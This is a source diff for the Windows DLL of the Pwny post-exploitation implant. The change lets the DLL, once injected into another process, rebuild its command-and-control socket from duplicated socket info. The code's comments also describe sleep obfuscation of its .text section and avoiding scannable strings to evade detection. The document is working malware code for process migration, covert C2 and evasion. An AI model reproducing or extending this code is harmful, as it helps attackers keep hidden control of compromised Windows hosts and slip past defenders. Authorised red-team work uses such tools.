@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -22,6 +22,7 @@
  * SOFTWARE.
  */
 
+#include <winsock2.h>
 #include <windows.h>
 
 #include <pwny/core.h>
@@ -179,13 +180,37 @@ DWORD Init(int sock)
 
 static DWORD WINAPI MigrateThread(LPVOID lpParam)
 {
-    int sock = (int)(ULONG_PTR)lpParam;
+    WSAPROTOCOL_INFOW *pInfo = (WSAPROTOCOL_INFOW *)lpParam;
+    WSAPROTOCOL_INFOW info;
+    WSADATA wsaData;
+    SOCKET sock;
+    DWORD result;
+
+    /* Copy protocol info locally before freeing the remote buffer. */
+    memcpy(&info, pInfo, sizeof(info));
+    VirtualFree(pInfo, 0, MEM_RELEASE);
 
     /* Give the old process time to send its QUIT response
      * and release the socket before we start I/O on it. */
     Sleep(500);
 
-    return Init(sock);
+    /* Initialize Winsock and recreate the socket from the
+     * WSAPROTOCOL_INFOW that the injector exported via
+     * WSADuplicateSocketW. */
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return 1;
+
+    sock = WSASocketW(info.iAddressFamily, info.iSocketType,
+                      info.iProtocol, &info, 0, 0);
+    if (sock == INVALID_SOCKET)
+    {
+        WSACleanup();
+        return 1;
+    }
+
+    result = Init((int)sock);
+    WSACleanup();
+    return result;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
@@ -210,14 +235,14 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 		 * .text section boundaries. */
 		start_sleep_obfuscation(hinstDLL);
 
-		/* The stager passes the duplicated C2 socket handle through
-		 * _DllInit → DllMain lpReserved.  No named sections, no
-		 * scannable strings — all handles are anonymous/duplicated. */
+		/* The stager passes a pointer to a WSAPROTOCOL_INFOW struct
+		 * (allocated in this process by the injector) through
+		 * _DllInit → DllMain lpReserved.  MigrateThread recreates
+		 * the C2 socket via WSASocketW from that protocol info. */
 		if (lpReserved != NULL)
 		{
-			DWORD_PTR sock = (DWORD_PTR)lpReserved;
 			CreateThread(NULL, 0, MigrateThread,
-			             (LPVOID)sock, 0, NULL);
+			             (LPVOID)lpReserved, 0, NULL);
 		}
 		break;
 	case DLL_PROCESS_DETACH:
